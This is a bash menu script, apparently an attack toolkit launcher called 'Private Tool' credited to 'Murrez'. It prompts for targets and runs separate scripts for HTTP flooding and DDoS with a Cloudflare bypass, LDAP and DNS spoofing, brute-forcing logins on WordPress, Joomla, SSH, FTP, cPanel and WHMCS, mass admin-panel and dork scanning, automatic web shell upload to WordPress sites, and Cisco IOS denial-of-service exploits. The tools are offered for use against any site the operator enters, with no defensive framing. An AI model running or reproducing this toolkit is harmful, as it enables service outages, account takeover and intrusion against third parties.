#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'              

exit_script()
{
  bash private.sh
}

crashed()
{
    clear
chmod +x crashed.py
    echo " "
    echo " "	
	echo -e "${RED}  
                                       $$\                       $$\ 
                                       $$ |                      $$ |
 $$$$$$$\  $$$$$$\  $$$$$$\   $$$$$$$\ $$$$$$$\   $$$$$$\   $$$$$$$ |
$$  _____|$$  __$$\ \____$$\ $$  _____|$$  __$$\ $$  __$$\ $$  __$$ |
$$ /      $$ |  \__|$$$$$$$ |\$$$$$$\  $$ |  $$ |$$$$$$$$ |$$ /  $$ |
$$ |      $$ |     $$  __$$ | \____$$\ $$ |  $$ |$$   ____|$$ |  $$ |
\$$$$$$$\ $$ |     \$$$$$$$ |$$$$$$$  |$$ |  $$ |\$$$$$$$\ \$$$$$$$ |
 \_______|\__|      \_______|\_______/ \__|  \__| \_______| \_______|
                                                                     
                                                                     
                                                                       
                                              
                                              ${WHITE}"
echo " Web Site : "
echo " "
read web
echo " Port [80 , 443] : "
echo " "
read port											  
python3 crashed.py $web $port
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

ldap()
{
    clear
chmod +x ldap.pl
    echo " "
    echo " "	
	echo -e "${RED}     ooooo       ooooooooo      o      oooooooooo  
      888         888    88o   888      888    888 
      888         888    888  8  88     888oooo88  
      888      o  888    888 8oooo88    888        
     o888ooooo88 o888ooo88 o88o  o888o o888o       
                                                
                                             ${WHITE} "
echo " IP : "
echo " "
read ip
echo " Port : "
echo " "
read port
echo " Size [800] : "
echo " "
read size	
echo " Time [100] : "
echo " "
read time								  
perl ldap.pl $ip $port $size $time
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

masspanel()
{
    clear
chmod +x massadmin.py
    echo " "
    echo " "	
	echo -e "${RED}                                                                                                               
                                                                                          $$\ 
                                                                                          $$ |
$$$$$$\$$$$\   $$$$$$\   $$$$$$$\  $$$$$$$\        $$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  $$ |
$$  _$$  _$$\  \____$$\ $$  _____|$$  _____|      $$  __$$\  \____$$\ $$  __$$\ $$  __$$\ $$ |
$$ / $$ / $$ | $$$$$$$ |\$$$$$$\  \$$$$$$\        $$ /  $$ | $$$$$$$ |$$ |  $$ |$$$$$$$$ |$$ |
$$ | $$ | $$ |$$  __$$ | \____$$\  \____$$\       $$ |  $$ |$$  __$$ |$$ |  $$ |$$   ____|$$ |
$$ | $$ | $$ |\$$$$$$$ |$$$$$$$  |$$$$$$$  |      $$$$$$$  |\$$$$$$$ |$$ |  $$ |\$$$$$$$\ $$ |
\__| \__| \__| \_______|\_______/ \_______/       $$  ____/  \_______|\__|  \__| \_______|\__|
                                                  $$ |                                        
                                                  $$ |                                        
                                                  \__|                                        
                                                                                                            
                                             ${WHITE} "							  
python massadmin.py
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

birthday()
{
    clear
chmod +x birthday.pl
    echo " "
	echo -e "${RED}              
     ______  _________ _______ _________          ______   _______          
    (  ___ \ \__   __/(  ____ )\__   __/|\     /|(  __  \ (  ___  )|\     /|
    | (   ) )   ) (   | (    )|   ) (   | )   ( || (  \  )| (   ) |( \   / )
    | (__/ /    | |   | (____)|   | |   | (___) || |   ) || (___) | \ (_) / 
    |  __ (     | |   |     __)   | |   |  ___  || |   | ||  ___  |  \   /  
    | (  \ \    | |   | (\ (      | |   | (   ) || |   ) || (   ) |   ) (   
    | )___) )___) (___| ) \ \__   | |   | )   ( || (__/  )| )   ( |   | |   
    |/ \___/ \_______/|/   \__/   )_(   |/     \|(______/ |/     \|   \_/   
                                                                        
                                        
 USAGE : sudo perl birthday.pl birthday.pl 10.0.0.1 172.16.54.3 32546 www.example.com 192.168.0.1 5500
										${WHITE} "
echo " Source IP : "
echo " "
read source
echo " Destination IP : "
echo " "
read destination
echo " Source Port : "
echo " "
read sourceport
echo " Spoofed Domain : "
echo " "
read domain
echo " Spoofed IP : "
echo " "
read spoofed
sudo perl birthday.pl $source $destination $sourceport $domain $spoofed
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

murrezpriv()
{
    clear
chmod +x murrez-priv.pl
    echo " "
	echo -e "${RED}              
                                                                     
                                                                
         $$$$$$\$$$$\  $$\   $$\  $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$$\ 
        $$  _$$  _$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ \____$$  |
        $$ / $$ / $$ |$$ |  $$ |$$ |  \__|$$ |  \__|$$$$$$$$ |  $$$$ _/ 
        $$ | $$ | $$ |$$ |  $$ |$$ |      $$ |      $$   ____| $$  _/   
        $$ | $$ | $$ |\$$$$$$  |$$ |      $$ |      \$$$$$$$\ $$$$$$$$\ 
        \__| \__| \__| \______/ \__|      \__|       \_______|\________|
                                                                

                                                                        
 
 Method : GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH
          GHP, PPS, COOKIE, HEADERFUZZ, TCPINJECT, MULTIPOINT

 Core Mode :- direct only send plain http request
            - proxydirect only send plain http request with proxys
            - cf bypass cloudflare mitigation, calculation the js and setting the real cookie
			
 Path Mode (SOON):
 - no	No send random string as path
 - rq	Random query
 - rd	Random dir
 - rf	Random files
 - rs	Switch between (Random query, dir and files)		"	
 
echo -e "										${WHITE} "
echo " Url : "
echo " "
read url
echo " Connections [65550] : "
echo " "
read connections
echo " Requests [150] : "
echo " "
read requests
echo " Method : "
echo " "
read method
echo " Core Mode : "
echo " "
read coremode
echo " Path Mode : "
echo " "
read pathmode
echo " Reel IP : "
echo " "
read reelip
echo " Time : "
echo " "
read time
sudo perl murrez-priv.pl $url $connections $requests $method $coremode $pathmode $reelip $time
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

priv8bruter()
{
    clear
chmod +x priv8bruter.pl
    echo " "
	echo -e "${RED}              
                        $$\            $$$$$$\                  
                        \__|          $$  __$$\                 
     $$$$$$\   $$$$$$\  $$\ $$\    $$\$$ /  $$ |                
    $$  __$$\ $$  __$$\ $$ |\$$\  $$  |$$$$$$  |                
    $$ /  $$ |$$ |  \__|$$ | \$$\$$  /$$  __$$<                 
    $$ |  $$ |$$ |      $$ |  \$$$  / $$ /  $$ |                
    $$$$$$$  |$$ |      $$ |   \$  /  \$$$$$$  |                
    $$  ____/ \__|      \__|    \_/    \______/                 
    $$ |                                                        
    $$ |                                                        
    \__|  
	
    $$\                             $$\                         
    $$ |                            $$ |                        
    $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$\    $$$$$$\   $$$$$$\  
    $$  __$$\ $$  __$$\ $$ |  $$ |\_$$  _|  $$  __$$\ $$  __$$\ 
    $$ |  $$ |$$ |  \__|$$ |  $$ |  $$ |    $$$$$$$$ |$$ |  \__|
    $$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\ $$   ____|$$ |      
    $$$$$$$  |$$ |      \$$$$$$  |  \$$$$  |\$$$$$$$\ $$ |      
    \_______/ \__|       \______/    \____/  \_______|\__|      
                                                                                                                                                     
                                              
    Options :
        WordPress [-wp]
        Joomla [-joom]
        FTP [-ftp]
        SSH [-ssh]
        WHMCS [-whm]
        Cpanel [-cp]
										${WHITE} "
echo " Option [-wp] : "
echo " "
read option
echo " Site List [site.txt] : "
echo " "
read sitelist
echo " Username List [user.txt] : "
echo " "
read userlist
echo " Password List [pass.txt] : "
echo " "
read passlist
echo " Proxy List [proxy.txt] : "
echo " "
read proxylist 
sudo perl priv8bruter.pl $option $sitelist $userlist $passlist $proxylist 
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

reverseip()
{
    clear
chmod +x reversexploit.pyc
    echo " "
    echo " "	
	echo -e "${RED}      "							  
python reversexploit.pyc
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

FloodByPass()
{
    clear
chmod +x FloodByPass.pl
	echo -e "${DARKGRAY} "
    echo "   #######                                ######        ######                       
   #       #       ####   ####  #####     #     # #   # #     #   ##    ####   ####  
   #       #      #    # #    # #    #    #     #  # #  #     #  #  #  #      #      
   #####   #      #    # #    # #    #    ######    #   ######  #    #  ####   ####  
   #       #      #    # #    # #    #    #     #   #   #       ######      #      # 
   #       #      #    # #    # #    #    #     #   #   #       #    # #    # #    # 
   #       ######  ####   ####  #####     ######    #   #       #    #  ####   ####                                                                            "
    echo " "	
    echo " "
    echo " "	
	echo -e "${WHITE}         "	
echo " Enter Host :  "
read host
echo " Enter Time :  "
read time	
perl FloodByPass.pl $host $time
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

monster()
{
    clear
chmod +x monster.pl
	echo -e "${LIGHTGREEN} "
    echo "                                              888                    
                                             888                    
                                             888                    
    88888b.d88b.   .d88b.  88888b.  .d8888b  888888 .d88b.  888d888 
    888  888  88b d88  88b 888  88b 88K      888   d8P  Y8b 888P    
    888  888  888 888  888 888  888  Y8888b. 888   88888888 888     
    888  888  888 Y88..88P 888  888      X88 Y88b. Y8b.     888     
    888  888  888   Y88P   888  888  88888P'   Y888  Y8888  888      "
    echo " "	
    echo " "		
	echo -e "${WHITE}         "		
echo " Enter Host :  "
read host	
perl monster.pl $host
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

pybruter()
{
    clear
chmod +x brute-force.py
	echo -e "${LIGHTGREEN} "
    echo "     888       888               888888b.                    888            
     888   o   888               888   88b                   888            
     888  d8b  888               888  .88P                   888            
     888 d888b 888 88888b.       8888888K.  888d888 888  888 888888 .d88b.  
     888d88888b888 888  88b      888   Y88b 888P    888  888 888   d8P  Y8b 
     88888P Y88888 888  888      888    888 888     888  888 888   88888888 
     8888P   Y8888 888 d88P      888   d88P 888     Y88b 888 Y88b. Y8b.     
     888P     Y888 88888P        8888888P   888       Y88888   Y888  Y8888  
                   888                                                      
                   888                                                      
                   888                                                     "
    echo " "				   
	echo -e "${WHITE}         "		
echo " Enter Site List :  "
read sitelist
echo " Enter Username List :  "
read userlist
echo " Enter Password List :  "
read passlist	
python brute-force.py $sitelist $userlist $passlist
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

dorkscaner()
{
    clear
chmod +x dorkscanner.py
	echo -e "${LIGHTGREEN} "
python dorkscanner.py
echo " "
echo " You can continue by pressing Enter. >> wordpress.txt and joomla.txt  "
read enter
}

massscriptgrabber()
{
    clear
chmod +x scam.pl
	echo -e "${LIGHTGREEN} "
perl scam.pl
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

fckeditorgrabber()
{
    clear
chmod +x target.pl
	echo -e "${LIGHTGREEN} "
    echo "     ooooooooooo  oooooooo8 oooo   oooo                 oooo o88    o8                        
      888    88 o888     88  888  o88  ooooooooo8  ooooo888  oooo o888oo ooooooo  oo oooooo   
      888ooo8   888          888888   888oooooo8 888    888   888  888 888     888 888    888 
      888       888o     oo  888  88o 888        888    888   888  888 888     888 888        
     o888o       888oooo88  o888o o888o 88oooo888  88ooo888o o888o  888o 88ooo88  o888o       
                                                                                         "
    echo " "				   
	echo -e "${WHITE}         "		
echo " "
echo " Site List :  "
read sitelist
perl target.pl $sitelist
echo " "
echo " You can continue by pressing Enter. >>> connector.txt  "
read enter
}

webserver()
{
    clear
chmod +x web0scanner.py
	echo -e "${LIGHTGREEN} "
python web0scanner.py
echo " "
echo " You can continue by pressing Enter. >>> vulnlist.txt  "
read enter
}

wpsingledork()
{
    clear
chmod +x wp-single.py
	echo -e "${LIGHTGREEN} "
python wp-single.py
echo " "
echo " You can continue by pressing Enter.  "
read enter
}

cmsautoshell()
{
    clear
chmod +x auto-upload.py
	echo -e "${LIGHTGREEN} "
    echo "      #                            #####                              
     # #   #    # #####  ####     #     # #    # ###### #      #      
    #   #  #    #   #   #    #    #       #    # #      #      #      
   #     # #    #   #   #    #     #####  ###### #####  #      #      
   ####### #    #   #   #    #          # #    # #      #      #      
   #     # #    #   #   #    #    #     # #    # #      #      #      
   #     #  ####    #    ####      #####  #    # ###### ###### ######       
                                                                                         "
echo " "
echo " Site List :  "
read sitelist
echo " Username [admin] :  "
read user
echo " Password [admin]   "
read pass
python auto-upload.py $sitelist $user $pass
echo " "
echo " You can continue by pressing Enter. >> success.txt "
read enter
}

dosexploit()
{
    clear
chmod +x dos-exploit.pl
	echo -e "${LIGHTBLUE} "
    echo "          _                                 _       _       
         | |                               | |     (_)  _   
       __| | ___   ___    _____ _   _ ____ | | ___  _ _| |_ 
      / _  |/ _ \ /___)  | ___ ( \ / )  _ \| |/ _ \| (_   _)
     ( (_| | |_| |___ |  | ____|) X (| |_| | | |_| | | | |_ 
      \____|\___/(___/   |_____|_/ \_)  __/ \_)___/|_|  \__)
                                     |_|       
									 
	[1] IOS Router Denial of Service Vulnerability
	[2] Catalyst SSH Protocol Mismatch Denial of Service Vulnerability
	[3] 675 Web Administration Denial of Service Vulnerability
	[4] IOS Software HTTP Request Denial of Service Vulnerability
	[5] 514 UDP Flood Denial of Service Vulnerability
	[6] Secure ACS for Windows NT Server Denial of Service Vulnerability
	[7] IOS HTTP Denial of Service Vulnerability	"							 								 
	echo -e "${WHITE} "
echo " "
echo " Target :  "
read target
echo " Exploit Modul :  "
read exploitmodul
perl dos-exploit.pl $target $exploitmodul
echo " "
echo " You can continue by pressing Enter. "
read enter
}

cfbypass()
{
    clear
chmod +x cfbypass.py
	echo -e "${LIGHTBLUE} "
python3 cfbypass.py
echo " "
echo " You can continue by pressing Enter. "
read enter
}

proxygrab()
{
    clear
chmod +x listgetter.py
	echo -e "${LIGHTBLUE} "
python3 listgetter.py
echo " "
echo " You can continue by pressing Enter. "
read enter
}

modul()
{
    clear
sudo apt-get install libswitch-perl
sudo apt-get install libwww-perl	
sudo apt-get install libwww-mechanize-perl	
sudo apt-get install libhtml-parser-perl libdb-file-lock-perl libnet-dns-perl		
sudo apt-get install libnet-rawip-perl  
sudo pip3 install cfscrape
sudo pip3 install colorama
echo " You can continue by pressing Enter.  "
read enter
}


exittool()
{
  exit 1
}

Take_input1()
{
clear
while :
do
clear  
echo -e " "
echo -e "     "                 
echo -e "${RED}      ____  ____   ____  __ __   ____  ______    ___      ______   ___    ___   _     
     |    \|    \ l    j|  T  | /    T|      T  /  _]    |      T /   \  /   \ | T    
     |  o  )  D  ) |  T |  |  |Y  o  ||      | /  [_     |      |Y     YY     Y| |    
     |   _/|    /  |  | |  |  ||     |l_j  l_jY    _]    l_j  l_j|  O  ||  O  || l___ 
     |  |  |    \  |  | l  :  !|  _  |  |  |  |   [_       |  |  |     ||     ||     T
     |  |  |  .  Y j  l  \   / |  |  |  |  |  |     T      |  |  l     !l     !|     |
     l__j  l__j\_j|____j  \_/  l__j__j  l__j  l_____j      l__j   \___/  \___/ l_____j
                                                                                 "
echo -e "${WHITE}  "
    echo -e "${LIGHTGREEN}        Created Murrez"
	echo " "
    echo -e "${LIGHTGREEN}   https://instagram.com/murrez.sec"	
	echo " "
    echo -e "${WHITE} 1 -> Crashed HTTP Flood"
    echo -e "${WHITE} 2 -> LDAP Spoof Script "
    echo -e "${WHITE} 3 -> Mass Panel Finder  "
    echo -e "${WHITE} 4 -> Birthday Layer 3,4,7 "	
    echo -e "${WHITE} 5 -> Methoder HTTP Flood "	
    echo -e "${WHITE} 6 -> Priv8 Bruter "	
    echo -e "${WHITE} 7 -> Reverse IP Exploit [Path Property] "	
    echo -e "${WHITE} 8 -> Flood ByPass "	
    echo -e "${WHITE} 9 -> Monster Path Flood "	
    echo -e "${WHITE} 10 -> Python WordPress Brute Force "	
    echo -e "${WHITE} 11 -> Dork Scanner "	
    echo -e "${WHITE} 12 -> Mass Scripts Grabber "	
    echo -e "${WHITE} 13 -> FCKeditor Grabber "
    echo -e "${WHITE} 14 -> Web Server Scanner [Mass Lookup] "			
    echo -e "${WHITE} 15 -> WordPress Single Dork Scanner"		
    echo -e "${WHITE} 16 -> WordPress CMS Auto Shell Upload"	
    echo -e "${WHITE} 17 -> DoS Exploits"		
    echo -e "${WHITE} 18 -> CloudFlare Bypass And DDoS"		
    echo -e "${WHITE} 19 -> Proxy Grabbed"			
    echo -e "${WHITE} 98 -> Modules Download "	
    echo -e "${WHITE} 99 -> Exit Script "	
	echo " "		
    echo -e " Command --> "	
    read yourch
    case $yourch in
      1) crashed ;;
	  2) ldap ;;
      3) masspanel ;;
	  4) birthday ;;
	  5) murrezpriv ;;
	  6) priv8bruter ;;
	  7) reverseip ;;
	  8) FloodByPass ;;
	  9) monster ;;	 
      10) pybruter	;;  
	  11) dorkscaner ;;
	  12) massscriptgrabber ;;
	  13) fckeditorgrabber ;;
	  14) webserver ;;
	  15) wpsingledork ;;
	  16) cmsautoshell ;;
	  17) dosexploit ;;
	  18) cfbypass ;;
	  19) proxygrab ;;
	  98) modul ;;
      ex) echo "Okey !" ;  exit 1  ;;
	  99) exittool  ;;	  
      *) echo " You have entered an incorrect number. " ;
         echo " You can continue by pressing Enter. " ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1